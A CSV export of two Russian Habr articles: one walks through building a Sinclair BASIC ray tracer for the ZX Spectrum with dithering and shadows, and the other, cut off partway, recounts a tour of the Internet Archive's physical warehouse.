Heading,up,down,link,text,date
Пишем трассировщик лучей для ZX Spectrum,86,1,https://habr.com/ru/articles/788984/,"Я люблю трассировщики лучей и даже посвятил им половину своей книги. Менее известна моя любовь к ZX Spectrum — домашнему компьютеру 1982 года, с которым я вырос и с которого начался мой интерес к графике и программированию. По современным стандартам эта машина столь смехотворно слаба (и даже по стандартам 1980-х), поэтому возникает неизбежный вопрос: в какой степени удастся портировать трассировщик лучей из книги Computer Graphics from Scratch на ZX Spectrum?В ZX Spectrum установлен процессор Z80 на 3,5 МГц (в тысячу раз медленнее, чем современные компьютеры), который не может умножать числа (!!!), и 48 КБ ОЗУ (в миллион раз меньше); он имеет графический режим 256x176 (примерно в двести раз меньше современного разрешения), способный отображать 15 цветов (в миллион раз меньше, к тому же с довольно необычными особенностями). Интересная машина для графического приложения, активно задействующего CPU!Я планирую реализовать его на Sinclair BASIC — встроенном языке программирования Spectrum. Это не просто BASIC, а древний, очень ограниченный диалект BASIC. Например, единственные структуры управления в нём — это FOR и IF (а у IF нет ELSE и даже ENDIF); все переменные глобальны; не существует вызовов функций, только GO TO и GO SUB; и так далее. Кроме того, он интерпретируемый, то есть сверхмедленный. Но, по крайней мере, он реализует программное умножение! Если мне нужна будет производительность, то я всегда могу переписать трассировщик на ассемблере.Я настроил минимально необходимую среду: код на BASIC я пишу в VS Code, компилирую его с помощью BAS2TAP и запускаю в эмуляторе FUSE. Благодаря этому скорость итераций оказалась достаточно высокой.Стоит отметить, что я не писал на BASIC примерно тридцать лет, поэтому был удивлён, насколько быстро всё вспомнил. Когда я занимался этим, мне было с четырёх до десяти лет, поэтому, вероятно, это осталось в мозгу как всё, что мы изучаем в этом возрасте, например, языки и акценты. Давайте будем писать код, как будто на дворе 1984 год!Первая итерация: простой трассировщик лучейМоя первая итерация была достаточно простой: я портировал начальный код трассировки лучей CGFS на BASIC, почти ничего не изменив, чтобы он выводил изображение размером 32x22 блока. Как ни странно, всё сработало:Число в левом верхнем углу (879.76) — это время в секундах, которое понадобилось для рендеринга этого изображения. Да, почти 15 минут. А вот та же сцена, отрендеренная трассировщиком лучей CGFS примерно за секунду, с использованием той же сцены и набора свойств:Учитывая ограничения, версия для Spectrum выглядит вполне неплохо! Давайте взглянем на код:   1 BRIGHT 1: CLS

   5 LET ROX = 0
   6 LET ROY = 0
   7 LET ROZ = 0
   8 LET TMIN = 0
   9 LET TMAX = 10000

  10 FOR X = 0 TO 31
  20   FOR Y = 0 TO 21

  30     LET RDX = (X - 16) / 32
  31     LET RDY = (11 - Y) / 32
  32     LET RDZ = 1

  40     GO SUB 1000

  50     PAPER COL
  51     PRINT AT Y, X; "" ""

 100   NEXT Y
 105   GO SUB 3000: PRINT AT 0, 0; TIME
 110 NEXT X

 120 STOP


1000 REM ===== TraceRay =====
1001 REM Params: (ROX, ROY, ROZ): ray origin; (RDX, RDY, RDZ): ray direction; (TMIN, TMAX): wanted ranges of t
1002 REM Returns: COL: pixel color

1010 LET COL = -1: LET MINT = 0

1100 RESTORE 9000
1101 READ NS
1102 FOR S = 1 TO NS

1110    READ SCX, SCY, SCZ, SRAD, SCOL

1200    LET COX = ROX - SCX
1201    LET COY = ROY - SCY
1202    LET COZ = ROZ - SCZ

1210    LET EQA = RDX*RDX + RDY*RDY + RDZ*RDZ
1211    LET EQB = 2*(RDX*COX + RDY*COY + RDZ*COZ)
1212    LET EQC = (COX*COX + COY*COY + COZ*COZ) - SRAD*SRAD

1220    LET DISC = EQB*EQB - 4*EQA*EQC
1230    IF DISC < 0 THEN GO TO 1500

1240    LET T1 = (-EQB + SQR(DISC)) / 2*EQA
1241    LET T2 = (-EQB - SQR(DISC)) / 2*EQA

1250    IF T1 >= TMIN AND T1 <= TMAX AND (T1 < MINT OR COL = -1) THEN LET COL = SCOL: LET MINT = T1
1300    IF T2 >= TMIN AND T2 <= TMAX AND (T2 < MINT OR COL = -1) THEN LET COL = SCOL: LET MINT = T2

1500 NEXT S

1999 IF COL = -1 THEN LET COL = 0
2000 RETURN

3000 REM ===== Get timestamp in seconds =====
3001 LET TIME = (65536*PEEK 23674 + 256*PEEK 23673 + PEEK 23672) / 50
3002 RETURN

8998 REM ===== Sphere data =====
8999 REM Sphere count, followed by (SCX, SCY, SCZ, SRAD, COLOR)
9000 DATA 4
9001 DATA  0, -1, 4, 1, 2
9002 DATA  2,  0, 4, 1, 1
9003 DATA -2,  0, 4, 1, 4
9004 DATA 0, -5001, 0, 5000, 6Если вы знакомы с трассировщиками лучей и с трассировщиком CGFS в частности, то структура кода будет вам привычна, несмотря на то, что написана на древнем диалекте BASIC. Но я всё равно пройдусь по коду, чтобы указать на странные особенности Spectrum.Во-первых, номера строк. Каждая строка должна была иметь номер, чтобы можно было использовать GO TO или GO SUB. В строки можно было вводить несколько операторов, разделённых двоеточием, что особенно полезно для оператора IF ... THEN, ведь в END IF в этом диалекте не существует!Можно заметить, что номера строк указаны вразброс. Редактор Spectrum BASIC ориентировался на строки, поэтому хотя номера строк и можно было менять, это был очень долгий процесс. Поэтому мы нумеровали строки числами, кратными 10, чтобы оставалось «место» между ними на случай необходимости добавить строки.Мы начинаем с этого:1 BRIGHT 1: CLSВ Spectrum использовался очень странный графический режим. Подробнее я расскажу о нём в следующем разделе, а пока просто скажем, что BRIGHT 1 выбирает яркую версию цветовой палитры, а CLS очищает экран. То есть мы готовы что-нибудь рисовать.Затем идёт основной цикл трассировщика:  5 LET ROX = 0
  6 LET ROY = 0
  7 LET ROZ = 0
  8 LET TMIN = 0
  9 LET TMAX = 10000

 10 FOR X = 0 TO 31
 20   FOR Y = 0 TO 21

 30     LET RDX = (X - 16) / 32
 31     LET RDY = (11 - Y) / 32
 32     LET RDZ = 1

 40     GO SUB 1000

 50     PAPER COL
 51     PRINT AT Y, X; "" ""

100   NEXT Y
105   GO SUB 3000: PRINT AT 0, 0; TIME
110 NEXT X

120 STOPВ строках с 5 по 9 задаются параметры, остающиеся константами для всего основного цикла. В BASIC есть массивы, но с ними довольно неудобно работать, поэтому не стоило использовать их для описания точек и векторов. Из-за этого точка начала луча RO представлена тремя переменными ROX, ROY и ROZ.В строках с 10 по 110 приведён основной цикл, итеративно обходящий холст (32x22 квадрата). После каждого прохода внутреннего цикла, рендеринга столбца квадратов, строка 105 выполняет эквивалент вызова функции: GO SUB 3000 переносит поток управления к подпроцедуре (subroutine) в строке 3000:3000 REM ===== Get timestamp in seconds =====
3001 LET TIME = (65536*PEEK 23674 + 256*PEEK 23673 + PEEK 23672) / 50
3002 RETURNСтрока 3000 начинается с REM (сокращение от remark, «примечание»). Сегодня мы называем их «комментариями», но ZX Spectrum — британская машина, порождение разума безумного гения сэра Клайва Синклера. То есть эта строка — просто комментарий.Магическое заклинание в строке 3001 считывает текущую метку времени в секундах. Как? PEEK получает адрес памяти и возвращает его содержимое. Эта строка лишь считывает хранящееся в памяти 24-битное число, описывающее внутренний счётчик FRAME; инкремент этого счётчика выполняется каждые 20 мс, поэтому мы делим его на 50, чтобы преобразовать в секунды, а затем сохраняем в переменную TIME.Каждая переменная в программе глобальна, поэтому RETURN в строке 3002 просто возвращает поток управления вызывавшей стороне, и подразумевается, что «возвращаемое значение» функции — это глобальная переменная TIME. Этот механизм GO SUB / RETURN очень похож на CALL / RET в ассемблере.Строка 120 завершает выполнение программы.Теперь давайте взглянем на внутренний цикл. Строки с 30 по 32 преобразуют координаты холста в координаты точки обзора (CanvasToViewport в CGFS). Направление луча задано (RDX, RDY, RDZ).Строка 40 выполняет ещё один «вызов функции»; на этот раз это эквивалент TraceRay. Когда она совершает возврат, переменная COL будет содержать цвет того, с чем столкнулся луч.Строки 50 и 51 отрисовывают блок. Это выполняется заданием цвета PAPER (фона) и отрисовкой пространства (подробнее об этом позже).Давайте рассмотрим TraceRay, начинающуюся в строке 1000. Она начинается с блока комментариев, в котором задокументированы необходимые входные и выходные данные:1000 REM ===== TraceRay =====
1001 REM Params: (ROX, ROY, ROZ): ray origin; (RDX, RDY, RDZ): ray direction; (TMIN, TMAX): wanted ranges of t
1002 REM Returns: COL: pixel colorТак как аргументов функций или возвращаемых значений не существует, всё задаётся глобально, косвенно и по договорённости. В данном случае входные данные — это (ROX, ROY, ROZ), (RDX, RDY, RDZ), TMIN и TMAX, а возвращаемое значение находится в переменной COL. Она описывает индекс в фиксированной цветовой палитре ZX Spectrum.В строке 1010 инициализируются значения, которые нам нужны для отслеживания ближайшего найденного на данный момент пересечения и цвета сферы в месте пересечения:1010 LET COL = -1: LET MINT = 0Затем мы начинаем цикл «для каждой сферы»:1100 RESTORE 9000
1101 READ NS
1102 FOR S = 1 TO NS
1110    READ SCX, SCY, SCZ, SRAD, SCOLСтрока 1100 сбрасывает «указатель данных» на строку 9000, которая содержит данные сцены:8998 REM ===== Sphere data =====
8999 REM Sphere count, followed by (SCX, SCY, SCZ, SRAD, COLOR)
9000 DATA 4
9001 DATA  0, -1, 4, 1, 2
9002 DATA  2,  0, 4, 1, 1
9003 DATA -2,  0, 4, 1, 4
9004 DATA  0, -5001, 0, 5000, 6Оператор READ в строке 1101 считывает первое значение (число 4 в строке 9000) в переменную NS. Затем строка 1102 начинает цикл «для каждой сферы», и первое, что мы делаем в строке 1110 — это считываем в переменные 5 значений, задающих сферу. После первой серии операторов READ указатель данных находится на первом значении строки 9002, готовом к считыванию в следующей итерации цикла.Строки с 1200 по 1300 решают простое уравнение пересечения луча со сферой, а строки 1250 и 1300 отслеживают самое ближнее пересечение:1200    LET COX = ROX - SCX
1201    LET COY = ROY - SCY
1202    LET COZ = ROZ - SCZ
1210    LET EQA = RDXRDX + RDYRDY + RDZRDZ
1211    LET EQB = 2(RDXCOX + RDYCOY + RDZCOZ)
1212    LET EQC = (COXCOX + COYCOY + COZCOZ) - SRAD*SRAD
1220    LET DISC = EQBEQB - 4EQA*EQC
1230    IF DISC < 0 THEN GO TO 1500
1240    LET T1 = (-EQB + SQR(DISC)) / 2EQA
1241    LET T2 = (-EQB - SQR(DISC)) / 2EQA
1250    IF T1 >= TMIN AND T1 <= TMAX AND (T1 < MINT OR COL = -1) THEN LET COL = SCOL: LET MINT = T1
1300    IF T2 >= TMIN AND T2 <= TMAX AND (T2 < MINT OR COL = -1) THEN LET COL = SCOL: LET MINT = T2Мы завершаем цикл, проверяя отсутствие пересечений; если их не было, то мы задаём значение цвета 0 (чёрный) и выполняем возврат:1999 IF COL = -1 THEN LET COL = 0
2000 RETURNВот и всё. Мы получили сверхмедленный результат с ультранизким разрешением:Мне кажется потрясающим, что для этого нужно всего пятьдесят строк относительно простого кода на маломощной машине начала 80-х!Но это лишь начало. Зачем останавливаться на 32x22, когда можно использовать все 256x176 пикселей экрана?Вторая итерация: разрешение повыше и обработка конфликта атрибутовМожно подумать, что для повышения разрешения этого трассировщика достаточно изменить значение внешнего цикла с 32x22 на 256x176 и отрисовывать отдельные пиксели при помощи PLOT вместо блочных квадратов при помощи PRINT. Это было бы в 64 раз медленнее (16 часов вместо 15 минут), но сработало бы... если не учесть странности графического режима ZX Spectrum!Первая версия ZX Spectrum имела суммарно 16 КБ ОЗУ, так что абсолютно критичной была эффективность использования памяти (мне купили гораздо более шикарную модель с 48 КБ). Для экономии памяти видео-ОЗУ было разделено на два блока: блок битовых карт, использующих по одному биту на пиксель, и блок атрибутов, использующий по одному байту на блок пикселей 8x8. Блок атрибутов мог присваивать этому блоку два цвета, называвшихся INK (передний план) и PAPER (фон).То есть можно использовать PLOT для установки или сброса соответствующего пикселю бита, который затем займёт один из двух цветов, назначаемых этому блоку. Это значит, что каждый блок пикселей 8x8 может отображать один или два цвета, но не три или больше.Всё это замечательно работало для текстовых приложений, так как символы тоже имеют размер 8x8, но для любой графики, и особенно для игр, это было очень большим ограничением. Это ограничение придаёт играм для Spectrum их очень характерную эстетику, потому что художникам приходилось обходить его, обычно проектируя экраны и спрайты так, чтобы они были выравнены по сетке пикселей 8x8, или переходя в полный монохром, или принимая тот факт, что конфликт атрибутов — неотъемлемый факт.Вернёмся к нашему трассировщику лучей. Повысить разрешение легко. Устранить конфликт атрибутов уже сложнее.Идеального решения нет: что бы я ни делал, каждый блок 8x8 будет отображаться максимум двумя цветами. Поэтому я реализовал алгоритм аппроксимации. Я собираю цвета, представленные в блоке 8x8, нахожу два наиболее часто встречающихся и отрисовываю каждый пиксель одним из двух цветов.Чтобы отразить повышение разрешение и обработку блоков 8x8, нужно немного изменить внешний цикл: 10 FOR X = 0 TO 255 STEP 8
 20   FOR Y = 0 TO 175 STEP 8

...

500   NEXT Y
505   GO SUB 3000: PRINT AT 0, 0; TIME
510 NEXT X
520 STOPЗатем мы трассируем 64 луча, собирая цвета в массив: 30      DIM C(64)
 31      LET CI = 1
 32      DIM A(8)

120     REM --- For each 8x8 block, collect the pixel colors and their counts ---
125     FOR U = X TO X+7
126       FOR V = Y TO Y+7

130         LET RDX = (U - 128) / 256
131         LET RDY = (V - 88) / 256
132         LET RDZ = 1

140         GO SUB 1000
141         LET C(CI) = COL
142         LET CI = CI + 1
143         LET A(COL+1) = A(COL+1) + 1

160       NEXT V
161     NEXT UСтрока 30 при помощи DIM преобразует переменную C в массив из 64 элементов. Индексы массивов начинаются с 1, поэтому строка 31 инициализирует CI (индекс C) со значением 1. Строка 32 создаёт ещё один массив A, в котором будет храниться количество цветов.Строки с 140 по 143 вызывают TraceRay и сохраняют её результаты: цвет пикселя в C, а обновлённое количество цветов — в A. Цвета имеют номера от 0 до 7, а индексы — от 1 до 8, так что нужно использовать в качестве индекса COL+1.Дальше нам нужно найти самый частый и второй по частоте цвета:199     REM --- Find the most and second most frequent colors in this 8x8 block ---
201     LET MFC = 0
202     FOR C = 1 TO 8
203       IF A(C) > MFC THEN LET MFC = A(C): LET MFI = C
204     NEXT C
205     LET FCOL = MFI - 1

207     LET II = MFI: LET MFC = 0: LET MFI = 0
208     FOR C = 1 TO 8
209       IF C <> II AND A(C) > MFC THEN LET MFC = A(C): LET MFI = C
210     NEXT C
211     LET SCOL = MFI - 1Настало время рисовать пиксели. Если все пиксели имеют одинаковый цвет, просто рисуем блок:259     REM --- If there's only one color, paint the whole block --
260     IF SCOL <> -1 THEN GO TO 300
270     POKE 22528 + X/8 + 32*(21-Y/8), 64 + FCOL * 8
280     GO TO 500Нужно объяснить, что такое POKE. POKE помещает байт в адрес памяти. Первый параметр — это адрес текущего блока 8x8 в блоке атрибутов. Второй параметр, байт, задающий значения INK и PAPER — это сочетание цвета INK со сдвигом влево на 3 бита плюс бит для включения атрибута BRIGHT.Если не все пиксели имеют одинаковый цвет, нам нужно раскрашивать их по отдельности. Цвету PAPER блока присваивается самый частый цвет (чтобы нужно было раскрашивать меньше пикселей); мы обходим массив, и любой пиксель, не являющийся самым частым цветом, отрисовывается цветом INK, которому присвоен второй по частоте цвет:300     REM --- Otherwise set the PAPER to the most frequent color, and draw everything else in the second most frequent color --
301     LET CI = 1
310     FOR U = X TO X+7
311       FOR V = Y TO Y+7

320         IF C(CI) <> FCOL THEN PLOT INK SCOL; PAPER FCOL; U, V
321         LET CI = CI + 1

350       NEXT V
351     NEXT UРаботает довольно неплохо!Но конфликты атрибутов всё равно возникают. Посмотрим на увеличенную часть:Наложив сетку, отображающую границы блоков, проще разобраться в проблеме. Два блока, которые выглядят «неправильно», должны состоять из трёх цветов: чёрного, жёлтого и или зелёного, или красного. Но Spectrum на это не способен, поэтому алгоритм сделал именно так.Можете взглянуть на полный исходный код этой итерации.Также стоит отметить, что код невероятно медленный — он выполняется больше 17 часов! Даже если выставить в эмуляторе скорость 20000%, рендеринг занимает приличное время. Можно ли улучшить ситуацию?Третья итерация: повышение производительностиЯ решил использовать проход оптимизации. Вот, что я сделал:Для каждого из блоков 8x8 трассируем лучи в четырёх углах, и если цвет во всех углах одинаков, то закрашиваем блок целиком. В большинстве случаев это требует четырёх лучей на блок вместо 64, то есть ускоряет рендеринг в 16 раз. Разумеется, если существуют мелкие объекты, целиком попадающие в блок, то трассировщик их упустит; но для этой тестовой сцены такая аппроксимация выглядит вполне справедливой.Любой ценой избегаем умножений и делений. Z80 не может выполнять умножение аппаратно (не говоря уже о делении), поэтому BASIC реализует его программно, а это очень медленно.Пропишем некоторые константы на основании допущений. В частности, точка начала луча всегда (0, 0, 0), t_min — всегда 0, а t_max — всегда +inf, поэтому здесь мы сэкономим немного времени вычислений.По возможности вычисляем значения заранее. Зачем хранить радиус сферы в виде данных и возводить его в квадрат, если можно изначально хранить её квадрат?По возможности перемещаем вычисленные значения во внешние циклы. Например, значения, связанные с X, постоянны для каждого Y, а потому могут вычисляться меньше раз.Встроим подпроцедуру «самого частого цвета» и специализируем первый случай, чтобы она не игнорировала никакие цвета.Изменим номера строк так, чтобы GO SUB не переходила на строку с REM; можете не верить, но обработка строки с комментарием занимает время!Используем более короткие имена переменных. Этот BASIC интерпретируемый, так что каждый раз, когда мы ссылаемся на переменную, интерпретатор ищет её по имени…Ещё я попробовал несколько оптимизаций, которые не сработали, например, предварительное считывание DATA в массив или помещение отдельных выражений в переменные. У меня есть смутное ощущение, что важен порядок объявления переменных, нужно почитать об этом подробнее.Были ещё оптимизации, которые незначительно помогли, но снизили читаемость, так что я решил их не реализовывать.В конечном итоге результат оказался вполне неплохим. Изображение осталось идентичным по пикселям, но время выполнения снизилось до двух часов с небольшим:Можете взглянуть на полный исходный код этой итерации.Четвёртая итерация: источник света (только один)Поначалу я хотел остановиться на этом; учитывая ограничения среды, мне казалось, что почти больше ничего сделать не получится.Очевидным следующим шагом стала бы реализация освещения. Уравнения и алгоритмы освещения относительно просты, но основная проблема заключается в ограниченном наборе цветов ZX Spectrum. Повторюсь, что у него фиксированный набор из 7 цветов  в обычной и яркой версии, плюс чёрный:Даже если бы у меня была значение яркости света в каждом пикселе, я бы не мог просто умножить его на цвет сферы, чтобы получить затенённый цвет, как это элементарно делается в RGB. Что же делать?Конечно, идти на компромиссы. Я могу имитировать оттенки цветов, перемежая в нужной степени цвет и чёрный фон. Можно это делать для каждого блока 8x8, присвоив INK значение цвета, а PAPER — чёрный цвет. Компромисс в том, что будет присутствовать конфликт атрибутов.Как решить, раскрашивать ли пиксель, или оставить его чёрным? Первым делом я придумал использовать яркость света, вещественное число от 0.0 до 1.0, как вероятность того, что пиксель будет раскрашен цветом (в противном случае останется чёрным). Это сработало, но выглядело некрасиво. Есть решение получше под названием ordered dithering (упорядоченный дизеринг). Его идея заключается в том, чтобы хранить матрицу пороговых значений, по одному на пиксель, помогающую определить, нужно ли раскрашивать пиксель. Пороговые значения выстроены в таком порядке, что создают повторяющееся и приятные глазу паттерны пикселей для любого уровня яркости. Существует матрица дизеринга 8x8, идеально соответствующая блокам цвета 8x8, которые я обрабатываю, так что реализовать её было на удивление просто.Из соображений простоты я решил использовать только один источник света. Даже при упорядоченном дизеринге мне будет недостаточно оттенков для адекватного представления нюансов нескольких источников, освещающих один объект. По той же причине я использовал только рассеянное освещение, без отражений.Наша цель — отрендерить нечто подобное:Насколько близко мы сможем подобраться к этому на скромном ZX Spectrum?Я внёс в код следующие изменения:Использовать трюк с четырьмя лучами на блок 8x8 больше было нельзя, потому что яркость света на каждом пикселе может быть разной. Можно было вычислять по одной яркости на блок, но мне не хотелось терять разрешение освещения. Так что по сравнению с предыдущей итерацией производительность сильно пострадала. Исключением будет случай, когда все четыре угла блока 8x8 чёрные, в этом случае его можно спокойно игнорировать.Код расчёта освещения довольно прост: в подпроцедуре TraceRay мне нужно было отслеживать индекс ближайшей сферы (поэтому мне также пришлось в начале программы записать данные сфер в массив S). Если после цикла сфер луч сталкивается с какой-то из них, я вычисляю пересечение между лучом и сферой, нормаль в этой точке сферы и освещение в этой точке:1601 LET NX = DX*MT - S(CS, 1): LET NY = DY*MT - S(CS, 2): LET NZ = DZ*MT - S(CS, 3)
1610 LET PL = AI
1615 LET NL = (NX*LX + NY*LY + NZ*LZ)
1620 IF NL > 0 THEN LET PL = PL + DI * NL / SQR(NX*NX + NY*NY + NZ*NZ)В этом фрагменте CS — это индекс ближайшей сферы (Closest Sphere); PL — новая выходная переменная, обозначающая освещение пикселя (Pixel Lighting); (LX, LY, LZ), DI и AI задаются в другом месте, они описывают направление света, его яркость и яркость внешнего освещения. Из соображений производительности LX, LY, LZ задают нормализованный вектор, благодаря чему я смог избавиться от SQR и от деления в строке 1620.Больше мне не нужно искать второй по частоте цвет в каждом блоке 8x8, потому что теперь в каждом блоке отображается только самый частый цвет и чёрный.Я добавил код для добавления в массив матрицу упорядоченного дизеринга Байера:   3 GO SUB 7000

   ...

6999 REM ===== Initialize 8x8 Bayer matrix =====
7000 DIM H(64)
7001 RESTORE 7100
7002 FOR I = 1 TO 64
7003   READ H(I): LET H(I) = H(I) / 64
7004 NEXT I
7005 RETURN

7100 DATA  0, 32,  8, 40,  2, 34, 10, 42
7101 DATA 48, 16, 56, 24, 50, 18, 58, 26
7102 DATA 12, 44,  4, 36, 14, 46,  6, 38
7103 DATA 60, 28, 52, 20, 62, 30, 54, 22
7104 DATA  3, 35, 11, 43,  1, 33,  9, 41
7105 DATA 51, 19, 59, 27, 49, 17, 57, 25
7106 DATA 15, 47,  7, 39, 13, 45,  5, 37
7107 DATA 63, 31, 55, 23, 61, 29, 53, 21Кроме того, перед раскрашиванием пикселя я сравниваю его яркость освещения с соответствующим пороговым значением в матрице Байера:320 IF C(CI) > 0 AND H(CI) <= L(CI) THEN PLOT U, VЯ запустил эту итерацию и, если честно, добрую минуту не мог поверить своим глазам:Во-первых, это сработало!Выполнение довольно медленное по сравнению с предыдущей итерацией, в основном из-а отсутствия трюка с четырьмя лучами на блок плюс из-за дополнительных вычислений освещённости. Но всё не так уж плохо.Конфликт атрибутов по-прежнему присутствует, и теперь он гораздо очевиднее. Можно ли улучшить ситуацию? Вероятно. Похоже, конфликты жёлтого/красного можно исправить, делая блоки красными и жёлтыми, избавляясь от деталей затенённости (потому что в них не будет чёрного). Ситуацию с зелёным/жёлтым и синим/жёлтым, похоже, можно сильно улучшить, использовав чёрный/жёлтый, синий/жёлтый и снова чёрный/жёлтый. Возможно, я ещё вернусь к этому.Можете посмотреть на полный исходный код этой итерации.Пятая итерация: тениК этому моменту я уже достаточно хорошо освоился со средой и привык кодить, как будто на дворе 1984 год, поэтому решил проверить, насколько далеко смогу зайти. Следующий этап — тени.Для этого уже почти всё готово. Теория довольно проста: перед вычислением освещения для точки нам нужно выяснить, есть ли объект между точкой и источником освещения, блокирующий его (то есть отбрасывающий тень). Мне просто нужно было реализовать специализированную версию TraceRay, выполняющую трассировку от пересечения первичного луча и сферы в направлении направленного источника света, и выполняющую возврат сразу после нахождения пересечения:2090 REM ----- Specialized TraceRay for shadow checks -----
2091 REM Params: (IX, IY, IZ): ray start; (LX, LY, LZ): ray direction (directional light vector)
2092 REM Returns: H = 1 if the ray intersects any sphere, H = 0 otherwise
2093 REM Optimizations: (TMIN, TMAX) hardcoded to (epsilon, +inf)

2100 LET A = 2*(LX*LX + LY*LY + LZ*LZ)

2110 FOR S = 1 TO NS

2111    LET CX = IX - S(S,1): LET CY = IY - S(S,2): LET CZ = IZ - S(S,3)
2120    LET B = -2*(CX*LX + CY*LY + CZ*LZ)
2130    LET C = (CX*CX + CY*CY + CZ*CZ) - S(S, 4)

2140    LET D = B*B - 2*A*C
2150    IF D < 0 THEN GO TO 2210
2160    LET D = SQR(D)

2170    LET T = (B + D) / A
2180    IF T > 0.01 THEN LET H = 1: RETURN
2190    LET T = (B - D) / A
2200    IF T > 0.01 THEN LET H = 1: RETURN

2210 NEXT S
2220 LET H = 0: RETURNЭтот код вызывается до вычисления освещённости:1600 LET IX = DX*MT: LET IY = DY*MT: LET IZ = DZ*MT
1601 LET NX = IX - S(CS, 1): LET NY = IY - S(CS, 2): LET NZ = IZ - S(CS, 3)
1610 LET PL = AI

1612 GO SUB 2100: IF H = 1 THEN RETURN

1615 LET NL = (NX*LX + NY*LY + NZ*LZ)
1620 IF NL > 0 THEN LET PL = PL + DI * NL / SQR(NX*NX + NY*NY + NZ*NZ)И вот, что получилось…Сравним это с результатом трассировщика лучей CGFS:Довольно медленно из-за дополнительных вычислений (мы снова вернулись к 17 часам), но определённо того стоит!Можно посмотреть полный исходный код этой итерации.Что дальше?Очевидно, что дальше можно реализовать отражения. Но смешивать цвета будет практически невозможно, поэтому объекты будут или полностью отражающими, или совсем не отражающими, и это просто будет выглядеть странно. Интересной проблемой станет рекурсия: Spectrum поддерживает её, но поскольку локальные переменные отсутствуют, каждый рекурсивный вызов будет перезаписывать глобальные переменные, поэтому придётся реализовать собственный стек. Вполне выполнимо, но, похоже, не будет стоить всех усилий.Ещё одна ось для совершенствования — это производительность. Можно было бы переписать весь код на ассемблере и посмотреть, насколько быстро он сможет работать. Я смогу управлять нужной степенью точности, так что, возможно, подойдут и вычисления с фиксированной запятой (или менее точная версия SQR). Вероятно, когда-нибудь я возьмусь за это!Кроме того, меня по-прежнему напрягает конфликт атрибутов на краях объектов. У меня есть пара идей по улучшению ситуации, однако из-за ограничений Spectrum их невозможно будет устранить на 100%.Ностальгические рассужденияЭто был интересный проект на выходные. Совершенно бесполезный, но интересный!Было приятно снова писать на Sinclair BASIC спустя тридцать лет. Хотя язык остался прежним, изменился я: начал думать в более высокоуровневых концепциях и затем переносить их в BASIC. Не знаю, потому ли это, что современные языки дали мне лучший вокабуляр для мышления, который я могу перенести в BASIC, или потому, что мне уже не десять лет. Может быть и то, и другое вместе.В частности, в этой программе разумно применяется GO TO, который, как все знают, Считается Вредным™. В те времена это практически всё, что у нас было: никаких вызовов функций, только подпроцедуры с помощью GO SUB; никаких WHILE или REPEAT; у IF не было END IF; FOR не имел BREAK или CONTINUE (эти ключевые слова существовали, но делали не то, что вы могли бы подумать). Так что неизбежно приходилось пользоваться GO TO. Да, это может привести к спагетти-коду, но необязательно; мой собственный код из статьи, хотя и прост, структурирован чисто.Кроме того, я скучаю по непосредственности и простоте среды. Никаких фреймворков, зависимостей, практически никаких абстракций (даже умножение реализовано программно!). ZX Spectrum можно было полностью осознавать. Весь набор команд Z80, особенности ПЗУ и АЛУ — всё это достаточно легко умещалось в голове. Можно было рассуждать о производительности вплоть до уровня тактов процессора — никаких кэшей, конвейеров или чего-то ещё, усложняющего жизнь. Я скучаю по всему этому. Нынешние дети никогда не смогут ощутить, каково работать в такой среде, и это меня печалит.9999 STOP",2024-01-26
Что находится внутри физического Архива Интернета,60,0,https://habr.com/ru/companies/beeline_tech/articles/788948/,"
Когда я был в Сан-Франциско на AI Engineer Summit, то воспользовался возможностью посетить Архив Интернета — физический архив в калифорнийском городе Ричмонде примерно в двадцати минутах езды от Сан-Франциско.

Я купил билет на «экскурсию по закулисью физического архива» 11 октября и прибыл прямо перед началом; я был рад, что не приехал раньше, потому что физический архив находится (вполне логично) на складе в промышленной части Ричмонда. Похоже, больше ничего интересного в окрестностях нет.

Я попросил водителя Uber подбросить меня до парковки со знаком Internet Archive. Но оглядевшись, я не смог найти публичного входа на склад. Рядом стояло ещё несколько озадаченных фанатов истории Интернета, мы неуклюже поздоровались и начали обсуждать, там ли находимся. Вскоре нас заметила пара людей в конце улицы и помахала нам.


Физическое хранилище Архива Интернета в Ричмонде.

Оказалось, что группа людей уже освоилась внутри основного здания, попивая бесплатную колу, пиво или минералку и заедая их фуршетными блюдами. В толпе были и пожилые люди (вероятно, из поколения, работавшего в Кремниевой долине в 1960-х и 70-х), и гики помоложе (думаю, это были или библиотекари, или заядлые пользователи веба; я отношусь ко второй категории).

Когда примерно через полтора часа началась экскурсия, тридцать-сорок человек собралось вокруг пышущего энтузиазмом человека в красной рубашке. Разумеется, это был основатель Архива Интернета Брюстер Кейл. Поначалу меня удивило, что он сам будет проводить экскурсию, но вскоре стало ясно, что Кейл живёт и дышит миссией Архива Интернета. Он начал экскурсию с демонстрации грузовых контейнеров, заполненных старыми книгами и другими материалами, параллельно делясь фактами («Архив Интернета — некоммерческая организация; мы основали её 27 лет назад, в 1996 году»).


Брюстер Кейл на фоне контейнеров (обычных, физических).

Позже Кейл с энтузиазмом рассказывал о машине для сканирования книг, показывал подаренные архиву стопки коробок (заполненных книгами, видеокассетами, дисками, аудиозаписями, кассетами и другими носителями) и гордо стоял в стороне, пока архивисты фильмов объясняли, как они преобразуют старые домашние видео в цифровые файлы с высоким разрешением. Это был впечатляющий обзор повседневной работы Архива, в штат которого входят калифорнийцы, в том числе и сын Брюстера Кэслон.

Что хранится в Архиве Интернета
Наверно, больше всего Архив Интернета известен благодаря своей Wayback Machine, которую запустили в 2001 году; она архивирует веб-страницы ещё с 1996 года. «Ежедневно мы собираем около миллиарда URL — потрясающе большое число. И сейчас в коллекции Wayback Machine два с половиной триллиона URL. Запросы к ним выполняются примерно шесть-семь тысяч раз в секунду».

Но физический архив, как следует из его неформального названия — это хранилище физических носителей: книг, каталогов, старых компьютерных дисков, плёнок, аудиозаписей, кассет и многого другого. Когда в Архив поступает новый носитель, его персонал сначала решает, не является ли он дубликатом чего-то уже имеющегося; этот процесс они называют дедупликацией. Если он оказывается дубликатом, то его выбрасывают или отдают. Если нет, то его оцифровывают, а физический объект архивируют. (Кстати, Архив Интернета заявляет, что делает доступными цифровые копии только тех книг, физическими экземплярами которых он владеет.)


Специально изготовленный сканер старых плёнок.

«Мы занимаемся оцифровкой книг ещё с начала 2000-х. В конечном итоге мы создали собственные сканеры книг», — рассказывает Кейл. Он добавил, что АИ оцифровывает примерно миллион книг в год и что они оцифровали порядка 7-8 миллионов книг (на странице About говорится, что АИ содержит «41 миллион книг и текстов», то есть большинство из них должно быть каким-то другими текстами, не книгами).

